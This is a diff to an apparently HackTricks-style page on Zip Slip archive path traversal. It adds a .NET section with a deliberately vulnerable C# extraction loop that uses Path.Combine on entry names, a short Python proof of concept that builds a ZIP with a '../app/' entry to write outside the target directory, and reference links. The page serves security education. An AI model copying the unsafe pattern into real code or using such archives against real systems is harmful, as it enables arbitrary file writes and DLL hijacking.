@@ -18,6 +18,32 @@ Consequences range from overwriting arbitrary files to directly achieving **remo
 2. Victim extracts the archive with a vulnerable tool that trusts the embedded path (or follows symlinks) instead of sanitising it or forcing extraction beneath the chosen directory.
 3. The file is written in the attacker-controlled location and executed/loaded next time the system or user triggers that path.
 
+### .NET `Path.Combine` + `ZipArchive` traversal
+
+A common .NET anti-pattern is combining the intended destination with **user-controlled** `ZipArchiveEntry.FullName` and extracting without path normalisation:
+
+```csharp
+using (var zip = ZipFile.OpenRead(zipPath))
+{
+    foreach (var entry in zip.Entries)
+    {
+        var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
+        entry.ExtractToFile(dest);
+    }
+}
+```
+
+- If `entry.FullName` starts with `..\\` it traverses; if it is an **absolute path** the left-hand component is discarded entirely, yielding an **arbitrary file write** as the extraction identity.
+- Proof-of-concept archive to write into a sibling `app` directory watched by a scheduled scanner:
+
+```python
+import zipfile
+with zipfile.ZipFile("slip.zip", "w") as z:
+    z.writestr("../app/0xdf.txt", "ABCD")
+```
+
+Dropping that ZIP into the monitored inbox results in `C:\samples\app\0xdf.txt`, proving traversal outside `C:\samples\queue\` and enabling follow-on primitives (e.g., DLL hijacks).
+
 ## Real-World Example – WinRAR ≤ 7.12 (CVE-2025-8088)
 
 WinRAR for Windows (including the `rar` / `unrar` CLI, the DLL and the portable source) failed to validate filenames during extraction.  
@@ -97,5 +123,7 @@ ESET reported RomCom (Storm-0978/UNC2596) spear-phishing campaigns that attached
 
 - [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
 - [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
+- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
+- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
 
 {{#include ../banners/hacktricks-training.md}}
